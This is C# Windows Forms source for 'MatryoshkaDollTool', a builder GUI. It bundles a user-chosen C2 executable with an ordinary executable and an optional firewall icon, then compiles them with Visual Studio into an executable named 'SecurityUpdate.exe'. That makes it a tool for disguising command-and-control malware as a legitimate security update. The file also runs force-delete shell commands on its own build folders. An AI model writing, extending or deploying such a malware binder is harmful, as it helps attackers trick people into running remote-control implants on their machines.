using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace MatryoshkaDollTool
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Multiselect = false;
            dialog.Title = "Choose Your ICON";
            dialog.Filter = "ICON(*.ico)|*.ico";
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string icofile = dialog.FileName;
                textBox3.Text = icofile;
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {

            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Multiselect = false;
            dialog.Title = "Choose Your C2 exe";
            dialog.Filter = "c2exe(*.exe)|*.exe";
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string c2file = dialog.FileName;
                textBox1.Text = c2file;
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Multiselect = false;
            dialog.Title = "Choose Your raw exe";
            dialog.Filter = "raw_exe(*.exe)|*.exe";
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string rawfile = dialog.FileName;
                textBox2.Text = rawfile;
            }

        }




        private void button3_Click(object sender, EventArgs e)
        {

            //判断输入框的选择情况

            if (textBox1.TextLength == 0 || textBox1.TextLength == 0)
            {
                MessageBox.Show("文件都不选，你套个鸡儿娃");
            }
            else {

                //复制文件
                Boolean flag = false;
                string pwd = System.Environment.CurrentDirectory + @"\SecurityUpdate\";

                Cmd copy = new Cmd();

                if (textBox3.TextLength != 0) 
                {
                    flag = copy.resFile(textBox3.Text, @pwd + @"Firewall1.ico");
                }

                flag = copy.resFile(textBox1.Text, @pwd + @"Resources\Patch1.exe");
                flag = copy.resFile(textBox2.Text, @pwd + @"Resources\Patch2.exe");

                if (!flag) 
                {
                    MessageBox.Show("文件未正常导入，可能套娃失败。");
                }

                string vswhere_path = System.Environment.CurrentDirectory + @"\" + "vswhere.exe";

                string sln_path = System.Environment.CurrentDirectory + @"\" + "SecurityUpdate.sln";

                Cmd c = new Cmd();

                //C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\devenv.exe
                string vspath = c.run(vswhere_path + " -prerelease -latest -property installationPath", 10).Replace("\r", "").Replace("\n", "");
                string devenvtool = @vspath + @"\Common7\IDE\devenv.exe";
                if (vspath.Equals("error"))
                {
                    MessageBox.Show("can not found Visual studio IDE");
                }
                else if (!System.IO.File.Exists(devenvtool))
                {
                    MessageBox.Show("can not found devenv.exe (PLS Install Visual studio IDE)");
                }

                Cmd c1 = new Cmd();
                string del = c1.run("del /f/s/q " + @pwd + @"\bin\", 10);
                del = c1.run("del /f/s/q " + @pwd + @"\obj\", 10);
                string buildres = c1.build(@devenvtool, @sln_path, 10);

                
                while (1>0){

                    string bot = System.Environment.CurrentDirectory + @"\SecurityUpdate\bin\Debug\SecurityUpdate.exe";

                    if (System.IO.File.Exists(@bot))
                    {
                        MessageBox.Show("套娃成功");
                        Cmd c2 = new Cmd();
                        string s = c2.run("explorer /select," + @bot,5);
                        break;
                    }
                }

            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/TheKingOfDuck/MatryoshkaDollTool/issues");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/TheKingOfDuck");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://blog.gzsec.org/");
        }
    }
}
